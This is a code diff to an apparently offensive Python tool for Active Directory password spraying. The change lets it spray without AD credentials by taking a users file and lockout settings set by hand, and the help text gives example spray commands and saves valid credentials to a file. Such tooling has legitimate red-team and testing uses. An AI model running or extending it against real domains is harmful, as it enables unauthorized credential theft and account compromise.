@@ -966,20 +966,21 @@ def cmd_spray(args) -> int:
             return 1
     else:
         # Validate required args
-        if not args.workgroup:
-            print(f"{Colors.RED}[!] Workgroup is required (-w){Colors.NC}", file=sys.stderr)
-            return 1
         if not args.dc:
             print(f"{Colors.RED}[!] Domain controller is required (-d){Colors.NC}", file=sys.stderr)
             return 1
-        if not args.username:
-            print(f"{Colors.RED}[!] Username is required (-u) for AD enumeration{Colors.NC}", file=sys.stderr)
-            return 1
-        if not args.password:
-            print(f"{Colors.RED}[!] Password is required (-p) for AD enumeration{Colors.NC}", file=sys.stderr)
+        if not args.workgroup:
+            print(f"{Colors.RED}[!] Workgroup is required (-w){Colors.NC}", file=sys.stderr)
             return 1
         if not args.spray_passwords:
             print(f"{Colors.RED}[!] Passwords file is required (--passwords){Colors.NC}", file=sys.stderr)
+            return 1
+
+        have_creds = args.username and args.password
+
+        # If no creds, must have users file
+        if not have_creds and not args.users_file:
+            print(f"{Colors.RED}[!] Either provide AD creds (-u/-p) or a users file (--users){Colors.NC}", file=sys.stderr)
             return 1
 
         # Load passwords to spray
@@ -994,40 +995,66 @@ def cmd_spray(args) -> int:
             print(f"{Colors.RED}[!] Passwords file is empty{Colors.NC}", file=sys.stderr)
             return 1
 
-        # Fetch users and policy from AD
-        try:
-            if args.users_file:
-                # Use provided users file instead of enumerating
+        # Get users and policy
+        if have_creds:
+            # Fetch from AD
+            try:
+                if args.users_file:
+                    # Use provided users file, fetch policy from AD
+                    with open(args.users_file) as f:
+                        users = [line.strip() for line in f if line.strip()]
+                    print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)
+
+                    with ADConnection(
+                        dc_host=args.dc,
+                        username=args.username,
+                        password=args.password,
+                        workgroup=args.workgroup,
+                        base_dn=args.base_dn,
+                        use_ssl=args.ssl,
+                        port=args.port,
+                    ) as ad:
+                        policy_dict = ad.get_lockout_policy()
+                        policy = PasswordPolicy.from_dict(policy_dict)
+                else:
+                    # Enumerate users and fetch policy from AD
+                    users, policy = fetch_domain_info(
+                        dc_host=args.dc,
+                        username=args.username,
+                        password=args.password,
+                        workgroup=args.workgroup,
+                        use_ssl=args.ssl,
+                        port=args.port,
+                        base_dn=args.base_dn,
+                        verbose=args.verbose,
+                    )
+            except Exception as e:
+                print(f"{Colors.RED}[!] Failed to connect to AD: {e}{Colors.NC}", file=sys.stderr)
+                return 1
+        else:
+            # No creds - use users file and manual/default policy
+            try:
                 with open(args.users_file) as f:
                     users = [line.strip() for line in f if line.strip()]
-                print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)
+            except FileNotFoundError:
+                print(f"{Colors.RED}[!] Users file not found: {args.users_file}{Colors.NC}", file=sys.stderr)
+                return 1
 
-                # Still need to fetch policy
-                with ADConnection(
-                    dc_host=args.dc,
-                    username=args.username,
-                    password=args.password,
-                    workgroup=args.workgroup,
-                    base_dn=args.base_dn,
-                    use_ssl=args.ssl,
-                    port=args.port,
-                ) as ad:
-                    policy_dict = ad.get_lockout_policy()
-                    policy = PasswordPolicy.from_dict(policy_dict)
-            else:
-                users, policy = fetch_domain_info(
-                    dc_host=args.dc,
-                    username=args.username,
-                    password=args.password,
-                    workgroup=args.workgroup,
-                    use_ssl=args.ssl,
-                    port=args.port,
-                    base_dn=args.base_dn,
-                    verbose=args.verbose,
-                )
-        except Exception as e:
-            print(f"{Colors.RED}[!] Failed to connect to AD: {e}{Colors.NC}", file=sys.stderr)
-            return 1
+            print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)
+            print(f"{Colors.ORANGE}[+] No AD creds - using manual policy settings{Colors.NC}", file=sys.stderr)
+
+            policy = PasswordPolicy(
+                lockout_threshold=args.lockout_threshold,
+                lockout_duration_minutes=args.lockout_window,
+                lockout_observation_window_minutes=args.lockout_window,
+                min_password_length=args.min_length,
+                password_history_length=0,
+                complexity_enabled=args.complexity,
+            )
+
+            print(f"{Colors.BLUE}[+]   Lockout: {policy.lockout_threshold} / {policy.lockout_observation_window_minutes}min{Colors.NC}", file=sys.stderr)
+            print(f"{Colors.BLUE}[+]   Min length: {policy.min_password_length}{Colors.NC}", file=sys.stderr)
+            print(f"{Colors.BLUE}[+]   Complexity: {policy.complexity_enabled}{Colors.NC}", file=sys.stderr)
 
         if not users:
             print(f"{Colors.RED}[!] No users found{Colors.NC}", file=sys.stderr)
@@ -1143,20 +1170,19 @@ def main() -> int:
         help="Execute a password spray",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-This tool automatically:
-  - Enumerates users from AD (or uses provided file)
-  - Fetches lockout policy and adjusts timing to avoid lockouts
-  - Skips passwords that don't meet minimum length requirements
-
 Examples:
-  # New spray (auto-enumerate users)
+  # With AD creds (auto-enumerate users and fetch policy)
   %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt
 
-  # Use a users file instead of enumerating
+  # With AD creds + users file (fetch policy only)
   %(prog)s -d dc01.local -w CORP -u admin -p 'P@ss' --passwords pwds.txt --users users.txt
 
-  # With username-as-password and output file
-  %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords pwds.txt --userpass -o valid.txt
+  # Without AD creds (manual policy, requires --users)
+  %(prog)s -d 10.0.0.1 -w CORP --users users.txt --passwords pwds.txt
+
+  # Without AD creds, custom policy
+  %(prog)s -d 10.0.0.1 -w CORP --users users.txt --passwords pwds.txt \\
+      --lockout-threshold 3 --lockout-window 15 --min-length 10 --complexity
 
   # Resume existing spray
   %(prog)s --resume 305578a5af638c2b377b41b43e693291
@@ -1164,11 +1190,11 @@ Examples:
     )
     spray_parser.add_argument("-d", "--dc", help="Domain controller FQDN or IP address")
     spray_parser.add_argument("-w", "--workgroup", help="NetBIOS domain/workgroup name (e.g., CORP)")
-    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration")
-    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration")
+    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration (optional if --users provided)")
+    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration (optional if --users provided)")
     spray_parser.add_argument("--base-dn", dest="base_dn", help="Override LDAP base DN")
     spray_parser.add_argument("--passwords", dest="spray_passwords", help="File containing passwords to spray")
-    spray_parser.add_argument("--users", dest="users_file", help="File containing users (skip enumeration)")
+    spray_parser.add_argument("--users", dest="users_file", help="File containing users (required if no creds)")
     spray_parser.add_argument("-o", "--output", default="valid_creds.txt",
                               help="Output file for valid credentials (default: valid_creds.txt)")
     spray_parser.add_argument("-v", "--verbose", type=int, default=3, choices=[0, 1, 2, 3],
@@ -1179,6 +1205,15 @@ Examples:
     spray_parser.add_argument("--resume", metavar="SESSION_ID", help="Resume an existing session")
     spray_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
+    # Policy override flags (used when no AD creds available)
+    spray_parser.add_argument("--lockout-threshold", type=int, default=5,
+                              help="Lockout threshold override (default: 5)")
+    spray_parser.add_argument("--lockout-window", type=int, default=30,
+                              help="Lockout observation window in minutes (default: 30)")
+    spray_parser.add_argument("--min-length", type=int, default=0,
+                              help="Minimum password length override (default: 0)")
+    spray_parser.add_argument("--complexity", action="store_true",
+                              help="Enable password complexity checking")
     spray_parser.set_defaults(func=cmd_spray)
 
     # Sessions subcommand
